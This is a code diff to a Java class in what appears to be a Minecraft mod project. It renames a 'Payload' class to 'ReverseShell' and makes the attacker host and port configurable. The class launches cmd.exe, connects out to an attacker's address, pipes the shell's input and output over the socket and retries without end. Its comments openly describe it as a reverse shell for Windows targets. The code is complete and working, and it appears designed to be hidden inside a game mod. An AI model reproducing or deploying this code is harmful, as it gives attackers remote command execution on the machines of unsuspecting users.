@@ -1,5 +1,7 @@
 package com.example.examplemod;
 
+import tv.twitch.broadcast.IngestList;
+
 import java.net.Socket;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -45,26 +47,43 @@ import java.io.OutputStream;
  * @author cornerpirate
  */
 
-public class Payload extends Thread {
+public class ReverseShell extends Thread {
+
+    private String targetHost = "127.0.0.1";
+    private Integer targetPort = 31337;
+
+    public ReverseShell(String targetHost, Integer targetPort){
+        this.targetHost = targetHost;
+        this.targetPort = targetPort;
+    }
+
+    // Empty stub for method overloading
+    public ReverseShell() {}
 
     /**
      * This method is called when the payload is compiled and executed. I am
      * showing a reverse shell here for Windows.
      */
     public void run() {
+        if (targetHost == null){
+            targetHost = "127.0.0.1";
+        }
+        if (targetPort == null){
+            targetPort = 31337;
+        }
         while(true) {
+            // IP address or hostname of attacker
+            // String targetHost = "192.168.1.72";
+
+            // For a windows target do this. For linux "/bin/bash"
+            String cmd = "cmd.exe";
             try {
-                System.out.println("test123");
-                // IP address or hostname of attacker
-                String attacker = "192.168.1.72";
-                int port = 25566;
-                // For a windows target do this. For linux "/bin/bash"
-                String cmd = "cmd.exe";
+                System.out.println("Trying reverse shell to: " + targetHost + ":" + Integer.toString(targetPort));
                 // The rest creates a new process
                 // Establishes a socket to the attacker
                 // Then redirects the stdin, stdout and stderr to the port.
                 Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-                Socket s = new Socket(attacker, port);
+                Socket s = new Socket(targetHost, targetPort);
                 InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                 OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                 // read all input and output forever.
@@ -89,10 +108,11 @@ public class Payload extends Thread {
                 }
                 p.destroy();
                 s.close();
+                break;
             } catch (Exception ex) {
                 // Ignore errors as we are doing naughty things anyway.
+                System.out.println("Cant connect to " + targetHost + ":" + Integer.toString(targetPort) + ", retrying...");
             }
-            System.out.println("test1234");
         }
     }
 }
